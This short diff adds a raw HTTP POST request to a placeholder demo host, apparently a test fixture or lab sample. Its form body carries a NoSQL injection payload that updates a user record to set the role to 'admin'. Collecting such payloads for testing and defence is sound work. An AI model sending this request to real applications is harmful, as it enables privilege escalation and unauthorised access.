@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Connection: close
+
+input=db.users.update({&quot;u&quot;:&quot;x&quot;},{$set:{&quot;role&quot;:&quot;admin&quot;}})
